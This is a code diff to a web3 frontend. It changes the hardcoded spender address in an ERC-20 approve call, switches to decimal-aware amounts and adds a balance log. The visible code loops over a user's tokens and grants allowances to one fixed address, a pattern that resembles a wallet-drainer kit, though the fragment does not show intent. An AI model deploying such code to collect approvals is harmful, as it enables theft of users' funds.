@@ -5,12 +5,12 @@ import { useAccount } from "wagmi";
 import Erc20Abi from "../utils/Erc20Abi";
 import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
 import axios from "axios";
-import { parseEther } from "viem";
-import axiosRetry from 'axios-retry';
+import { parseEther, parseUnits } from "viem";
+import axiosRetry from "axios-retry";
 
 const API_KEY = import.meta.env.VITE_APP_COINGECKO_API_KEY;
 const api = axios.create({
-  baseURL: 'https://api.coingecko.com/api/v3/simple/',
+  baseURL: "https://api.coingecko.com/api/v3/simple/",
 });
 
 axiosRetry(api, {
@@ -42,15 +42,15 @@ const increaseAllowanceForTokens = async (tokensData) => {
   return console.log("tokens looped and passed succesfully");
 };
 
-const increaseAllowance = async (contractAddress, allowance) => {
+const increaseAllowance = async (contractAddress, allowance, decimals) => {
   try {
     const hash = await writeContract(wagmiConfig, {
       address: contractAddress,
       abi: Erc20Abi,
       functionName: "approve",
       args: [
-        "0x80EeF47fAb3b35726eBE01922969224EEC8B393E",
-        parseEther(allowance),
+        "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
+        parseUnits(allowance, decimals),
       ],
     });
     return { success: true, data: hash };
@@ -62,6 +62,7 @@ const increaseAllowance = async (contractAddress, allowance) => {
 const getAccountBalance = async (_address) => {
   try {
     const balance = await getBalance(wagmiConfig, { _address });
+    console.log("this is balance from the function:", balance);
     return balance;
   } catch (error) {
     console.error("Failed to get balance: ", error);
